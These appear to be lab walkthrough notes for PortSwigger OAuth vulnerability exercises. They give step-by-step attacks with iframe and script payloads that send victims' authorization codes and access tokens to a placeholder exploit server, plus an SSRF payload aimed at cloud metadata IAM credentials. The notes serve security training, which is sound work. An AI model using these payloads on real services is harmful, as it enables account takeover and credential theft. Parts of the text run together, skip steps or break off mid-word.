# What is OAUTH?

[OAuth 2.0 authentication vulnerabilities | Web Security Academy](https://portswigger.net/web-security/oauth)

# [**Mind_Map**](https://pbs.twimg.com/media/EZ1WqmcXYAAqwSH?format=jpg&name=900x900)

# OAUTH Testing Techniques

# [**Authentication bypass via OAuth implicit flow**](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

```
1. Sudy the requests and responses that make up the OAuth flow. This starts from the authorization request "GET /auth?client_id=[...]".2. Notice that the client application receives some basic information about the user from the OAuth service. It then logs the user in by sending a POST request containing this information to its own "/authenticate" endpoint, along with the acc3. Send the "POST /authenticate" request to Burp Repeater. In Repeater, change the email address to "victim@email.net" and send the request. Observe that you do not encounter an error.4. Right-click on the POST request and select "Request in browser" > "In original session". Copy this URL and visit it in the browser. You are logged in as Carlos and the lab is solved.
```

# [**Forced OAuth profile linking**](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

```
2. Notice that you have the option to attach your social media profile to your existing account.3. notice that when yoou try to attach your social media accont the target redirect you to social media website then go back to the target again4. log out from the account and try to login with your social media linked account notice that it redirects you directly to target without any credentials needed5. In the "GET /auth?client_id[...]" request, observe that the "redirect_uri" for this functionality sends the authorization code to the endpoint like "/oauth-linking" without "state" parameter6. Turn on proxy interception and select the "Attach a social profile"  copy url from th "GET /oauth-linking?code=[...]" request8. Drop the request. This is important to ensure that the code is not used and, therefore, **remains valid**.10. in your exploit server : <iframe src="<https://YOUR-TARGET.net/oauth-linking?code=STOLEN-CODE>"></iframe>11. Deliver the exploit to the victim. When their browser loads the iframe, it will complete the OAuth flow using your social media profile, attaching it to victim account on the blog website.12. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the victim user
```

# [**OAuth account hijacking via**](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri) [`**redirect_uri**`](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

```
1. login with social account then logout and try login again2. notice that you are redirected without any credentials3. notice redirect_uri vulnerable to open redirect4. notice there are /callback?code=authe-callback-code5. go to your exploit server and try:<iframe src="<https://TARGET-OAUTH-SERVER.net/auth?client_id=CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER.net&response_type=code&scope=openid%20profile%20email>"></iframe>6. steal the victim code and make request to<https://YOUR-Target/oauth-callback?code=STOLEN-CODE>
```

# [**Stealing OAuth access tokens via an open redirect**](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

```
1. Dicover Open Redirect Vulnerable Parameter2. Study the OAUTH Flow Confirm that the "redirect_uri" parameter is in fact vulnerable to directory traversal       example:  --> <https://YOUR-TARGET/oauth-callback/../post?postId=1>3. chain those vulns to steal victim access tokenexaple: -->  <https://TARGET-OAUTH-SERVER.net/auth?client_id=YOUR-ID&redirect_uri=https://YOUR-TARGET/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email>4. in the exploit server:<script>if (!document.location.hash) { 	window.location = '<https://TARGET-OAUTH-SERVER.net/auth?client_id=YOUR-ID&redirect_uri=https://YOUR-TARGET/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email>'} else {	window.location = '/?'+document.location.hash.substr(1) }</script>5. Notice the API call for user info and replace the access token with the token you just stoled  and retrieve OAUTH-ACESS-TOKEN
```

# [**SSRF via OpenID dynamic client registration**](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)

```
1. try browse <https://TARGET-OAUTH-SERVER.net/.well-known/openid-configuration>2. Notice where the client registration endpoint is located example:"/reg"3. In Burp Repeater, create a suitable POST request and retrieve registration data like "client_id"----------------------------------------------POST /regHTTP/1.1Host: TARGET-OAUTH-SERVER.netContent-Type: application/json{ "redirect_uris" : [ "<https://example.com>" ]}---------------------------------------------4. Send the GET /client/CLIENT-ID/logo request to Burp Repeater5. Go back to "POST /reg" request,Add the "logo_uri" ,tst if it's vulnerable to ssrf-------------------------------------------------POST /regHTTP/1.1Host: TARGET-OAUTH-SERVER.netContent-Type: application/json{ "redirect_uris" : [ "<https://example.com>" ], "logo_uri" :"<https://BURP-COLLABORATOR-PAYLOAD>"}-------------------------------------------------6. Try Read meta data files like   "logo_uri" : "<http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/>"
```

# [**Stealing OAuth access tokens via a proxy page**](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)

```
1. Study OAUTH flow and make sure that "redirect_uri" parameter vulnerable to directory traversal2. find Vulnerable form include "iframe" + notice that it uses "postMessage()" + "window.location.href" example "/post/comment/comment-form"3. in exploit server----------------------------------------------------------------<iframe src="<https://OAUTH-SERVER.net/auth?client_id=YOUR-ID&redirect_uri=https://YOUR-TARGET.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email>"></iframe><script>  window.addEventListener('message', function(e) {  fetch("/" + encodeURIComponent(e.data.data)) },  false)</script>----------------------------------------------------------------4. retreive victim token then Send the GET-USER-INFORMATION Request example "GET /me" request to Burp Repeater. In Repeater, replace the token in the "Authorization: Bearer" header with the one you just copied and send the request
```